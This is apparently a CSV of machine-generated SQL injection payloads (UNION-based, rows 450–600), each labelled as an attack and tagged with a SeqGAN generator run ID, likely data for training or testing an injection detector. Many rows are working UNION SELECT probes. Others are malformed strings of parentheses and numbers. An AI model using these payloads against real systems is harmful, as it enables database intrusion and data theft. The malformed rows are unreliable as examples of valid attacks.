label,payload,family,payload_type,method,run_id,sample_index
attack,"1""   )    )    )    )    )    )    where 2774          )    )    )    )    )    )    union all select 5477,8067,null,8067,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,450
attack,1 union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,451
attack,1' union all select  * from usiolilahtwua where 3480--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,452
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,453
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,454
attack,"1'  )   union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,455
attack,1' union all select  --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,456
attack, select *$ where 8067-- union null -- 1',union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,457
attack,"1' union all union select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,458
attack,"1""'   where laog where 5477  (  (    )    --)    )    )    )   -- where 2878  (  ()    )    )    )    -- all 8123  (    )    )    )    --  (    )    )    )   -- 8665    )   where 1494null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,459
attack," select * from usiolila milidbd  =  )m    1917mllimol)    inqovm   )    )    )    )    )    )    )    where 1494  =  (  (    )   -- 2774 all where null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,460
attack,"1' union all select where 8067,8067,8067,4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,461
attack,"1""  )   union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,462
attack,"1'   )    )    )    )    )    union all select 9777,null,8067,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,463
attack,"1'  )   union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,464
attack,"1""   )    )    )    )    )    union all select 2132,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,465
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,466
attack,1'  )   union all 6621  (  (    )   -- v   -- 2774 where from where from where 5145--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,467
attack,"1' union all select  3900,3900,5087,5087,3900,3900--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,468
attack,"1'   )    )    )    )    )   union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,469
attack,"1'   )    )    )    )    )    )    union all select null,8890,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,470
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,471
attack,"1""   )    )    )    )    )    union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,472
attack,"  union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,473
attack,"1""   )    )    )    )    )    )    union all where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,474
attack,"1' union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,475
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,476
attack,"1'  )   union select all from 5145t(,4273,9777,9777--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,477
attack,"1'  )   union all where null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,478
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,479
attack,"1'   )    )    )    )    )    union all select  9777,1276,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,480
attack,"1'   )    )    )    )    )    )    where 2334  =  8268 union all 9517  (  (    )    )    )    )   -- -- null-- from 1047  (  (    )    )    )    -- all where 1917  (  (    )   --  (    )    )    )    -- ven)   --  (    )    )    )    -- v -- 4589  (    )   --  (    )    )    )   --  (    )   -- all 5870  (  (  (    )    )    )    --  (    )   -- mo,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,481
attack,"1'  )   -- all select 2887  (       (    )       )    --   )    )    )   -- from 4338  (    )    )   -- mlwhere null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,482
attack,"1' union all select null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,483
attack,"1' union all select 4338,1276,5087,1646,5087,3084,5925#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,484
attack,"1'   )    )    )    )    )    )    where 8890  =  1980 union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,485
attack,"1'  )   union all null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,486
attack,1' union all o 8890  (  (  (    )    )    --   (    )    where null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,487
attack,1' where *,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,488
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,489
attack,"1' union all where null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,490
attack,"1'   )    )    )    )    )    )    )    union all select null,null,null,null,2132--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,491
attack,"1'  )   union all select select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,492
attack,"1' union all select null-- where 1494  (  (  (    )    -- 1917)    -- 1,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,493
attack,"1'   )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,494
attack,"1"" where * from z3990 -- all where 5145 from ut where all  r,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,495
attack,"1' union all select 9945,8067,3900,3900,3900,3900,3900,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,496
attack,"-2639""   )    )    )    )    )    )    )    )    )    where 7815  (  (    )    )    --  (    )    )    )o'   )    )    )    where 2878  (  (       -- )    --   (    )   -- o",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,497
attack,"1' union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,498
attack,"1"" union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,499
attack,"1""   )    )    )    )    )    )    where d  =  8890  )        )    )    )    )    )    )    )    union all where 5145 5477,5145--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,500
attack,"1""   )    )    )    )    )    )    union all select null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,501
attack,"1' union all where null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,502
attack,"1'  )   union all where null null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,503
attack,"1' union all select null,null,8391,2446--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,504
attack,"1'  )   union all select 5145,5145,5770,9322,2132,9988,3059,5087#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,505
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,506
attack,"1' union all select 1917,1917--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,507
attack,"1'  where * from where 1249,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,508
attack,"1'   )    )    )    )    )    )    )    where 8268  1839  1980 union all select null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,509
attack,"1'"" union all where null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,510
attack,"1"" union all where null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,511
attack,"1""   )    )    )    )    )    union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,512
attack,"1'  )   union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,513
attack,"1' union all select 3900,5087,3900,3900,3900,9346,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,514
attack,1'  )   union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,515
attack,"1' union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,516
attack,"1"" union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,517
attack,"1""'+  (  select 'v9945q)   where where 6700  (4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,518
attack,"1'  )   union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,519
attack,"1'  )   union all where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,520
attack,"1'   )    )    )    )    )    )    ie)    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,521
attack,"1' union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,522
attack," select * from ut where where where from where 9322,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,523
attack,1'+  )   -- all where 1917  (       ah all midanvo' )    -- all where 1646  (       -- where null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,524
attack,1'   )    )    )    )    )    )    )    where 7815  =  1 union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,525
attack,"1' union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,526
attack,"1'  )   union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,527
attack,"1'   )   union all 43388890,x,12496039,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,528
attack,"1'  )   union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,529
attack,"1'  )   union all where null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,530
attack,"1' union all select null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,531
attack,1  )   union all 8890  (  (  (    )   --   (    )    )    where null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,532
attack,"1"" union all select null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,533
attack,"1"" union all select 5087,null,9347,null,  ,8890,1845,3900#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,534
attack,"1  )    )    )    )    )    )    union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,535
attack,"1' union all select 6996,1297,6996,1297,6996,6996,6996#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,536
attack,"1'   )    )    )    )    )    )    )    union select * from from 5145 1917  (    )    )    )    -- )    -- vlwhere 5477  (  (    --     --  )   )    )    )    --  (    )    )   --' 2446,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,537
attack,"1''   )    )    )    )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,538
attack,"1' 8890  )    )    )    --  )    )    )    )   union all select 8067,1249,8067,8067,8067,8067,8067,8067,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,539
attack,"1' union all * where 1917  (  ((      (    )    )    --   )    )    )    )   union all select * uat where 6700  (  (    )    --  )   )    )--   (    )   --  )    )    )    )    --  (    )    )   -- v'   -- all select where 9322,1839,2132,9988,9988,9988,9988",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,540
attack,"1""   )    )    )    )    )    )    where 6621  =  )f union all select null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,541
attack,"1  )    )    )    )    )    union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,542
attack,"1'   )    )    )    )    )    )    )    union all select null,null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,543
attack,"1'   )    )    )    )    )    )    union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,544
attack,"1""   )    )    )    )    )    union all select null,null,null,null,null,null,null,8890,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,545
attack,"1'  )   union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,546
attack,"1""   )    )    )    )    )    )    )    union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,547
attack,"1'  union all select ,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,548
attack,"1'   )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,549
attack,"1""   )    )    )    )    )    )    union all select where null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,550
attack,"1''   )    )    )    )    )    )    )    )    where 7815  =  )     union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,551
attack,"1'  )   union all select null,null,null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,552
attack,"1' union all select 1845,null,1845,1845,1845,1845,1845,1845,1845#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,553
attack,"1' union all select 51456996,6737,1917,9988,9988,91107230#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,554
attack,"1""   )    )    )    )    )    )    )    where 1494  =  1646 union all where --  from 6700#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,555
attack,"1' union all where null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,556
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,557
attack,"1' union all null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,558
attack,1'   )    )    )    )    )    )    where 2132  =  )  (  (  )    -- union all o * from u-- all where  3900d  (  (    )   --  (    )    )    )    )    -- lin omlid where where 8067-- 6700  (    --  )   )    )    --  )    )   -- l)    3072i' where 6386--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,559
attack,"1'  )    )    )    )    )    )    union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,560
attack,"1' union all select 3990,vers where where 1980  (    )    )   -- null-- from 5145 5145--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,561
attack,1  )   union all select --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,562
attack,"1""   )    )    )    )    )    )    union all select null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,563
attack,"1' union all select null,null,null,null,null,null,8890,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,564
attack,"1""   )    )    )    )    )    )    )    union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,565
attack,"1'  )   union "" AND 1  =  0 UNION ALL SELECT ""d  (    )    )    )    )    )    )    union all where 1917  (  (    )    )    -- 1917-- mnull--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,566
attack,"1'  )   union all null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,567
attack,"1""   )    )    )    )    )    )    where null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,568
attack,"1"" union all select null,null,null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,569
attack,"1'  )   union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,570
attack,"1' union all select 8391,8391,6962#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,571
attack,"1' union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,572
attack,"1' union all wherenull,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,573
attack,"1""   )    )    )    )    )    )    )    )    -- lt where where 5145 null,6349--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,574
attack,"1 union all select null,null,null,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,575
attack,1' union all select null--,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,576
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,577
attack,"1' union all select 1917,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,578
attack,"1' union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,579
attack,"1""   )    )    )    )    )    )    where null-- 1laa where 3990,v,5153,1249,1249,3081,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,580
attack,1'   )    )    )    )    )    )    union select 1494--  (    )    )   -- v' -- 2774 from where 9357 6441-- 1,union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,581
attack,"1' union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,582
attack,"1' union all select ,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,583
attack,"1'""   )    )    )    )    )    )    )    where 7230  =  8890 union all select null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,584
attack,"1""   )    )    )    )    )    )    union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,585
attack,"1' union all where null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,586
attack,"1'  )   union all select null,null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,587
attack,"1'   )    )    )    )    )    )    where 2088  =  7815 union all select o  5145,6996,3900,7230,8067--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,588
attack,"1""   )    )    )    )    )    )    where null all where 2334,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,589
attack,"1'   )    )    )    )    )    )    )     )   union all select null,null,null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,590
attack,"1""   )    )    )    where lila where 5925  =  (  (8067    --  )   )    --)    )    )    where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,591
attack,"1'+5145  )    )    )    )    )    --  (    )    )    )    )    )    -- all where 1646,9346,1646#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,592
attack,"1""   )    )    )    )    )    where null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,593
attack,"1'""   )    )    )    )    )    )    )    union all select null,null,null,null,null,8890--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,594
attack,"1' select * 3741,-- 1917-- m    --  (    )    )    )    )    --   (    )   -- null-- 2132')    )   --   (    )   -- ol)    )    )    )    --  where null,7294,8391,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,595
attack,"1"" union all select null,null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,596
attack,"1'  )   union all 4338,9347,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,597
attack,"1' union all select 1310 from from us where 3900d  (        )   (    )    --)    )    )   -- all where 7348,1917,1917,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,598
attack,"1'  union all select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,599
attack,"1"" union all select null,null,null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,600
